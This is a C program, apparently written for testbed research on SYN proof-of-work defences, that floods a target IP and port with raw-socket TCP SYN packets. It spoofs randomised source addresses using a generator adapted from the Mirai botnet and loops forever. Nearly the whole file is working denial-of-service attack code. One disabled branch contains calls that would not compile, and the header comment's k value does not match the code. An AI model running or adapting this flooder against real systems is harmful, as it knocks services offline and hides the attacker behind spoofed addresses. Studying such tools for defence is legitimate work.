/*
Generate a TCP SYN flood with SYN PoW (k=32)

For research purposes only, please use responsibly

Author: Samuel DeLaughter
License: MIT
*/


#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <linux/if_ether.h>

#define DEBUG 0 // Set verbosity
#define DELAY 0 // Set delay between packets in seconds
#define RAND_SRC_ADDR 1 // Toggle source address randomization
#define RAND_SRC_PORT 0 // Toggle source port randomization
#define INCREMENT_ID 1 // Toggle incrementing of IP ID field
#define FAST_CSUM 0 // Toggle fast checksum updating (experimental)

#if !defined (get16bits)
#define get16bits(d) ((((unsigned long)(((const unsigned char *)(d))[1])) << 8)\
                       +(unsigned long)(((const unsigned char *)(d))[0]) )
#endif

#ifndef NULL
# define NULL 0
#endif

// const unsigned long POW_THRESHOLD = 0; // k=1
// const unsigned long POW_THRESHOLD  = 2147483648; // k=2
// const unsigned long POW_THRESHOLD = 3221225472; // k=4
// const unsigned long POW_THRESHOLD  = 3758096384; // k=8
// const unsigned long POW_THRESHOLD  = 4026531840; // k=16
// const unsigned long POW_THRESHOLD  = 4160749568; // k=32
const unsigned long POW_THRESHOLD  = 4227858432; // k=64
const unsigned long MAX_ITERS  = 80;

/*
  Maximum total packet size.  This could be larger, but packets over 1500 bytes
	may exceed some path MTUs.  Plus a standard SYN packet (including the IP
	header) is only 40 bytes, and at most 100.  Other attack packets also tend to
	be very small in order to maximize per-packet overhead in the network.
*/
const uint32_t MAX_PACKET_SIZE = 1500;

// Default Source IP, in case we aren't randomizing
const char default_src_addr[32] = "127.0.0.1";

// Destination IP, unless otherwise specified with argv[1]
const char default_dst_addr[32] = "127.0.0.1";

// Default Source Port, in case we aren't randomizing
const uint16_t default_src_port = 9000;

// Destination Port, unless otherwise specified with argv[2]
const uint16_t default_dst_port = 80;

volatile int busy_wait_var;

struct pseudo_header {
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};

static void update_ip_csum(struct iphdr* iph, __be32 old_saddr) {
  if (old_saddr == iph->saddr){
    return;
  }
  __sum16 sum =  + (~ntohs(*(unsigned short *)&iph->saddr) & 0xffff);
  sum += ntohs(iph->check);
  sum = (sum & 0xffff) + (sum>>16);
  iph->check = htons(sum + (sum>>16) + 1);
}

static void update_tcp_csum(struct iphdr* iph, struct tcphdr* tcph, __be32 old_saddr) {
  if (old_saddr == iph->saddr){
    return;
  }
  __sum16 sum =  + (~ntohs(*(unsigned short *)&iph->saddr) & 0xffff);
  sum += ntohs(tcph->check);
  sum = (sum & 0xffff) + (sum>>16);
  tcph->check = htons(sum + (sum>>16) + 1);
}

static uint32_t random_ipv4(void) {
  // Adapted from Mirai (https://github.com/jgamblin/Mirai-Source-Code)
  uint32_t addr;
  uint8_t o1, o2, o3, o4;

  do {
    addr = (uint32_t)(rand());
    o1 = addr & 0xff;
    o2 = (addr >> 8) & 0xff;
    o3 = (addr >> 16) & 0xff;
    o4 = (addr >> 24) & 0xff;
  }

  while (
    // Skip private and reserved addresses, and DETERLab's network
    // https://en.wikipedia.org/wiki/Reserved_IP_addresses#IPv4

    (o1 == 0) ||                              // 0.0.0.0/8        - Current Network
    (o1 == 10) ||                             // 10.0.0.0/8       - Private
    (o1 == 100 && o2 >= 64 && o2 < 128) ||   // 100.64.0.0/10     - Carrier grade NAT
    (o1 == 127) ||                            // 127.0.0.0/8      - Loopback
    (o1 == 169 && o2 == 254) ||               // 169.254.0.0/16   - Link-local
    (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/12    - Private
    (o1 == 192 &&	(
			(o2 == 0 && (
				o3 == 0 || 														// 192.0.0.0/24			- Private
				o3 == 2																// 192.0.2.0/24			- Documentation
			)) ||
			(o2 == 88 && o3 == 99) ||								// 192.88.99.0/24		- Reserved
			(o2 == 168)															// 192.168.0.0/16		- Private
		)) ||
    (o1 == 198 && (
			(o2 == 18 || o2 == 19) ||								// 198.18.0.0/15		- Private
			(o2 == 51 && o3 == 100)									// 198.51.100.0/24	- Documentation
		)) ||
    (o1 == 203 && o2 == 0 && o3 == 113) ||    // 203.0.113.0/24   - Documentation
		(o1 == 206 && o2 == 117 && o3 == 25) ||		// 206.117.25.0/24	- DeterLab
		(o1 == 206 && o2 == 117 && o3 == 31) ||		// 206.117.31.0/24	- DeterLab High Performance
    (o1 >= 224)                               // 224.0.0.0+       - Various multicast/reserved
  );
  return addr;
}

static uint16_t random_port(void) {
	uint32_t port = (uint32_t)(rand()) & 0xff;
	return port;
}

unsigned short csum(unsigned short *ptr,int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;

	return(answer);
}

// PoW
struct message_digest {
	unsigned long saddr;
	unsigned long daddr;
	unsigned short sport;
	unsigned short dport;
	unsigned long seq;
	unsigned long ack_seq;
};

static __inline unsigned long SuperFastHash (const char* data, int len) {
	uint32_t hash = len, tmp;
	int rem;

  if (len <= 0 || data == NULL) return 0;

  rem = len & 3;
  len >>= 2;

  /* Main loop */
  for (;len > 0; len--) {
	  hash  += get16bits (data);
	  tmp    = (get16bits (data+2) << 11) ^ hash;
	  hash   = (hash << 16) ^ tmp;
	  data  += 2*sizeof (uint16_t);
	  hash  += hash >> 11;
  }

  /* Handle end cases */
  switch (rem) {
    case 3: hash += get16bits (data);
            hash ^= hash << 16;
            hash ^= ((signed char)data[sizeof (uint16_t)]) << 18;
            hash += hash >> 11;
            break;
    case 2: hash += get16bits (data);
            hash ^= hash << 11;
            hash += hash >> 17;
            break;
    case 1: hash += (signed char)*data;
            hash ^= hash << 10;
            hash += hash >> 1;
  }

  /* Force "avalanching" of final 127 bits */
  hash ^= hash << 3;
  hash += hash >> 5;
  hash ^= hash << 4;
  hash += hash >> 17;
  hash ^= hash << 25;
  hash += hash >> 6;

  return hash;
}

static __inline unsigned long syn_hash(struct message_digest* digest) {
	return SuperFastHash((const char *)digest, sizeof(struct message_digest));
}

static __inline unsigned short do_syn_pow(struct iphdr* iph, struct tcphdr* tcph) {
	unsigned long hash = 0;
	unsigned long best_hash = 0;
	unsigned short hash_iters = 0;
	// unsigned long nonce = bp, __u32 old_ack_seqf_get_prandom_u32();
	unsigned long nonce = 1;
	// unsigned long nonce = (unsigned long)(e->start_ts & 0xffffffff);
	unsigned long best_nonce = nonce;

	struct message_digest digest;
	digest.saddr = iph->saddr;
	digest.daddr = iph->daddr;
	digest.sport = tcph->source;
	digest.dport = tcph->dest;
	digest.seq = tcph->seq;

	if (POW_THRESHOLD > 0) {
		#pragma unroll
		for (unsigned short i=0; i<MAX_ITERS; i++) {
			digest.ack_seq = htonl(nonce + i);
			hash = syn_hash(&digest);
			hash_iters += 1;
			if (hash > best_hash) {
				best_nonce = nonce + i;
				best_hash = hash;
				if (best_hash >= POW_THRESHOLD) {
					break;
				}
			}
		}
		tcph->ack_seq = htonl(best_nonce);
	}
	return hash_iters;
}

int main(int argc, char *argv[]) {
	// Create a raw socket
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);

	if(s == -1) {
		// Socket creation failed, may be because of non-root privileges
		perror("Failed to create socket, do you have root priviliges?");
		exit(1);
	}

	// Get target (and optionally source) IP address
	char dst_addr[32];
	uint16_t dst_port;
	uint32_t busy_wait;

  if (argc > 1) {
		strcpy(dst_addr, argv[1]);
	} else {
    printf("Please specify a target IP address, and optionally a port number (default destination port is 80).\nExample usage: syn_flood 127.0.0.1 80\n");
		exit(1);
	}

	if (argc > 2) {
		dst_port = (uint16_t)atoi(argv[2]);
	} else {
		dst_port = default_dst_port;
	}

	if (argc > 3) {
		busy_wait = (uint32_t)atoi(argv[3]);
	} else {
		busy_wait = 0;
	}

	if (busy_wait < 0) {
		#if DEBUG
			printf("Received negative value for busywait parameter %u, exiting.\n", busy_wait);
		#endif
		return 1;
	}


	#if DEBUG
		printf ("Flooding target %s:%u\n", dst_addr, dst_port);

		#if RAND_SRC_ADDR
			printf("Randomizing source address\n");
		#else
			printf("Using source address %s\n", default_src_addr);
		#endif

		#if RAND_SRC_PORT
			printf("Randomizing source port\n");
		#else
			printf("Using source port %u\n", default_src_port);
		#endif
	#endif


  // Seed RNG
  srand(time(NULL));

	// Byte array to hold the full packet
	char datagram[MAX_PACKET_SIZE];

	// Pointer for the packet payload
	char *data;

	// Pointer for the pseudo-header used in TCP checksum
	char *pseudogram;

	// Zero out the packet buffer
	memset (datagram, 0, MAX_PACKET_SIZE);

	// Initialize headers
	struct iphdr *iph = (struct iphdr *) datagram;
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
	struct pseudo_header psh;

	// TCP Payload
	data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
	strcpy(data, "");

	// Address resolution
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(dst_port);
	sin.sin_addr.s_addr = inet_addr(dst_addr);

	// Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
	iph->id = htonl(0);	//Id of this packet, can be any value
	iph->frag_off = 0;
	iph->ttl = 64;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr(default_src_addr);
	iph->daddr = sin.sin_addr.s_addr;

	// IP checksum
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);

	// TCP Header
	tcph->source = htons(default_src_port);
	tcph->dest = sin.sin_port;
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5; // TCP Header Size in 32-bit words (5-15)
	tcph->fin=0;
	tcph->syn=1;
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons(65535); // Maximum possible window size (without scaling)
	tcph->check = 0;
	tcph->urg_ptr = 0;

	// TCP checksum
	psh.source_address = inet_addr(default_src_addr);
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));

	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
	pseudogram = malloc(psize);

	memcpy(pseudogram, (char*) &psh, sizeof (struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(data));

	tcph->check = csum((unsigned short*) pseudogram, psize);

	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int option_value = 1;
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (void *)&option_value, sizeof(option_value)) < 0) {
		perror("Error setting IP_HDRINCL");
		exit(1);
	}

	__be32 old_saddr;
	__be32 new_saddr;
	// Generate packets forever, the caller must terminate this program manually
	while(1) {
		#if RAND_SRC_ADDR || RAND_SRC_PORT || INCREMENT_ID
			#if RAND_SRC_ADDR
			// Generate a new random source IP, excluding certain prefixes
	    	new_saddr = (__be32)(random_ipv4());
			#endif

			#if RAND_SRC_PORT
				tcph->source = random_port();
			#endif

			#if INCREMENT_ID
				iph->id = htons(ntohs(iph->id) + 1);
			#endif

			#if FAST_CSUM
				/*
				In theory these functions could enable faster floods by updating
				checksums to account for modifications rather than recomputing
				checksums from scratch for each packet.  The downside is that they only
				allow chanigng a single header field at a time, which is currently
				hard-coded to be the source IP.  Additionally, the speedup appears to be
				irrelevant -- there is some other bottleneck in packet generation that
				limits us to ~150,000 packets per second on current-gen hardware, even
				with multi-threading.
				*/
		    old_saddr = iph->saddr;
				update_ip_csum(struct iphdr* iph, __be32 old_saddr);
	    	update_tcp_csum(struct iphdr* iph, struct tcphdr* tcph, __be32 old_saddr);
			#else
		    iph->check = 0;
		    iph->saddr = new_saddr;
		    iph->check = csum ((unsigned short *) datagram, iph->tot_len);

		    tcph->check = 0;
				tcph->seq = new_saddr;
		    psh.source_address = new_saddr;
		    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
		  	memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
		  	tcph->check = csum( (unsigned short*) pseudogram , psize);
			#endif
		#endif

		do_syn_pow(iph, tcph);

		// Send the packet
		if (sendto (s, datagram, iph->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0) {
			perror("Error sending packet");
		}

		#if DEBUG > 1
			printf("Sent packet from %s:%u to %s:%u\n", iph->saddr, tcph->source, iph->daddr, tcph->dest);
		#endif

		#if DELAY
    	sleep(DELAY);
		#endif

		if (busy_wait) {
			for (int i=0; i<busy_wait; i++) {
				busy_wait_var += 1;
			}
		}
	}

	return 0;
}
